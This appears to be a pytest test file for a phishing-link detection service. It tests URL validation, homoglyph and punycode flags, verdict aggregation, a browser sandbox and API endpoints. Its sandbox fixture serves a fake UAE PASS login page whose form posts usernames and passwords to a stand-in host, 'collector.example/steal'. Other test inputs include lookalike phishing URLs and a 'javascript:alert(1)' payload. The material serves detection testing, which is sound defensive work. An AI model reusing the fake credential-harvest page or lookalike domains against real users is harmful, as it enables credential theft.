"""Link Intelligence Engine: URL validation, registry, aggregation rules, sandbox and the /api/v1 contract."""
import http.server
import os
import secrets
import shutil
import threading

import pytest
from fastapi.testclient import TestClient

from raqeeb.link import pipeline, risk
from raqeeb.link.url_validator import InvalidURL, validate
from raqeeb.security import limiter


# ---------- URL validation ----------
def test_public_suffix_aware_registered_domain():
    v = validate("https://login.uaepass.example.com/verify")
    assert v["registered_domain"] == "example.com" and v["subdomain"] == "login.uaepass"
    assert validate("https://www.tamm.abudhabi/")["registered_domain"] == "tamm.abudhabi"
    assert validate("http://portal.gov.ae.co.uk/")["registered_domain"] == "ae.co.uk"


def test_normalisation():
    v = validate("  HTTPS://WWW.Example.COM:443//a//b?x=1#frag ")
    assert v["normalised_url"] == "https://www.example.com/a/b?x=1" and v["fragment"] == "frag"
    assert validate("example[.]com/pay")["normalised_url"] == "http://example.com/pay"
    assert validate("hxxp://evil.top")["scheme"] == "http"


def test_unicode_idn_and_homoglyphs():
    v = validate("https://uaepаss.com/login")  # Cyrillic 'а'
    assert v["flags"]["internationalised_domain"] and v["flags"]["homoglyph_characters"] and v["flags"]["mixed_scripts"]
    assert v["hostname"].startswith("xn--")
    p = validate("http://xn--uaepss-6nf.com/")
    assert p["flags"]["punycode"] and not p["hostname_unicode"].isascii()


def test_ip_credentials_and_tricks():
    assert validate("http://192.168.1.1/admin")["flags"]["ip_address"]
    assert validate("http://3232235777/")["flags"]["ip_address"]
    assert validate("http://[2001:db8::1]/")["flags"]["ip_address"]
    v = validate("http://uaepass.ae@evil.top/login")
    assert v["flags"]["embedded_credentials"] and v["registered_domain"] == "evil.top"
    assert validate("http://x.top/invoice.pdf.exe")["flags"]["double_extension"]
    assert validate("http://x.top/r?url=https://bank.example")["flags"]["redirect_parameter"]


@pytest.mark.parametrize("bad", ["", "   ", "javascript:alert(1)", "ftp://files.example.com/a", "http://", "http://exa mple..com:99999/"])
def test_malformed_input_is_rejected(bad):
    with pytest.raises(InvalidURL):
        validate(bad)


# ---------- aggregation ----------
@pytest.fixture(autouse=True)
def _limits():
    limiter.reset()


def test_verdicts_and_consistency():
    cases = {"https://www.tamm.abudhabi/": "SAFE", "https://uaepass-reactivate.com/login": "MALICIOUS",
             "bit.ly/3xYz": "INCONCLUSIVE", "https://login.uaepass.example.com/": "MALICIOUS"}
    for url, expected in cases.items():
        r = pipeline.analyse(url)
        assert r["verdict"] == expected, (url, r["verdict"], r["risk_score"])
    for url in list(cases) + ["https://www.google.com/search?q=tamm", "http://salik-topup.top/pay", "https://amazon.ae"]:
        r = pipeline.analyse(url)
        lvl = risk.level(r["risk_score"])
        assert r["risk_level"] == lvl
        assert (r["verdict"] == "MALICIOUS") == (lvl == "CRITICAL" or r["signature_result"]["known_threat"])
        assert r["verdict"] != "SAFE" or lvl == "LOW"
        assert 0 <= r["analysis_completeness"] <= 1 and r["assessment_confidence"] in ("LOW", "MEDIUM", "HIGH")


def test_brand_keyword_alone_on_legit_site_is_not_malicious():
    assert pipeline.analyse("https://www.google.com/search?q=uae+pass+login")["verdict"] in ("SAFE", "INCONCLUSIVE")


def test_quick_scan_reports_what_did_not_run():
    r = pipeline.analyse("https://example.org/")
    assert r["stages"]["sandbox"] == "not_run" and r["website_analysis"]["available"] is False
    assert r["visual_analysis"]["available"] is False and any("Quick scan" in x for x in r["limitations"])
    assert r["ml_result"]["available"] and r["ml_result"]["probability_calibrated"] is False


def test_failed_stage_never_counts_as_safe():
    r = pipeline.analyse("https://uaepass-reactivate.com/login", "deep")  # no network here: deep stages fail
    assert r["verdict"] == "MALICIOUS"
    assert r["stages"]["sandbox"] in ("unavailable", "partial", "complete")


# ---------- sandbox against a local fake page ----------
FAKE = (b"<html><head><title>UAE PASS - Login</title></head><body><h1>UAE PASS</h1><p>Verify your account today</p>"
        b"<form action='http://collector.example/steal' method='post'><input name='user'><input type='password' name='pw'>"
        b"</form></body></html>")


class _Page(http.server.BaseHTTPRequestHandler):
    def do_GET(self):  # noqa: N802
        self.send_response(200)
        self.send_header("Content-Type", "text/html")
        self.end_headers()
        self.wfile.write(FAKE)

    def log_message(self, *a):
        pass


def test_sandbox_finds_brand_credential_page(monkeypatch):
    srv = http.server.HTTPServer(("127.0.0.1", 0), _Page)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    url = f"http://127.0.0.1:{srv.server_port}/login"
    from raqeeb import security
    from raqeeb.link import sandbox
    allow = lambda u: None  # noqa: E731 - the real check refuses loopback; this test page lives on loopback
    monkeypatch.setattr(sandbox, "check_url", allow)
    monkeypatch.setattr(security, "check_url", allow)
    if shutil.which("google-chrome") and not os.environ.get("MIRA_CHROMIUM"):
        monkeypatch.setenv("MIRA_CHROMIUM", shutil.which("google-chrome"))
    r = pipeline.analyse(url, "deep")
    srv.shutdown()
    w = r["website_analysis"]
    assert w["available"] and w["password_fields"] == 1 and w["forms"][0]["external"]
    signals = {e["signal"] for e in r["evidence"]}
    assert "brand_credential_page" in signals and "external_form" in signals
    assert r["risk_score"] >= 90 and r["verdict"] == "MALICIOUS"


# ---------- API contract ----------
@pytest.fixture(scope="module")
def c():
    from server.app import app
    with TestClient(app) as client:
        yield client


def _login(c, email, pw):
    return {"Authorization": "Bearer " + c.post("/api/auth/login", json={"email": email, "password": pw}).json()["token"]}


def test_v1_scan_contract(c):
    r = c.post("/api/v1/scan", json={"url": "https://uaepass-reactivate.com/login"})
    assert r.status_code == 200
    j = r.json()
    for k in ("scan_id", "submitted_url", "final_url", "verdict", "risk_score", "risk_level", "assessment_confidence",
              "analysis_completeness", "detected_brand", "official_domain_match", "ml_result", "signature_result",
              "website_analysis", "visual_analysis", "evidence", "limitations", "timestamp"):
        assert k in j
    assert j["verdict"] in ("SAFE", "SUSPICIOUS", "MALICIOUS", "INCONCLUSIVE")
    assert c.get(f"/api/v1/scan/{j['scan_id']}").json()["verdict"] == j["verdict"]
    assert c.post("/api/v1/scan", json={"url": "javascript:alert(1)"}).status_code == 422
    assert c.post("/api/v1/scan", json={"url": "https://example.com", "mode": "deep"}).status_code == 401


def test_v1_health_models_registry(c):
    assert c.get("/api/v1/health").json()["status"] == "ok"
    m = c.get("/api/v1/models/status").json()
    assert m["available"] and m["threshold"]
    orgs = c.get("/api/v1/organizations").json()
    uaepass = next(o for o in orgs if o["id"] == "uaepass")
    assert uaepass["domains"][0]["status"] == "verified"
    assert any(d["status"] == "unverified_candidate" for o in orgs for d in o["domains"])
    assert c.get("/api/v1/intelligence/indicators").status_code == 401
    assert len(c.get("/api/v1/intelligence/sources").json()) >= 8


def test_v1_registry_admin_only(c):
    cit = c.post("/api/auth/register", json={"email": f"x{secrets.token_hex(3)}@example.ae", "password": "citizen-pass-1"}).json()["token"]
    body = {"name": "Test Authority", "domains": ["test-authority.example"]}
    assert c.post("/api/v1/organizations", json=body, headers={"Authorization": f"Bearer {cit}"}).status_code == 403
    adm = _login(c, "admin@mira.local", "test-admin-password")
    o = c.post("/api/v1/organizations", json=body, headers=adm).json()
    assert o["domains"][0]["status"] == "unverified_candidate"
    # an unverified domain is never used to call a link safe
    assert pipeline.analyse("https://test-authority.example/")["official_domain_match"] is False
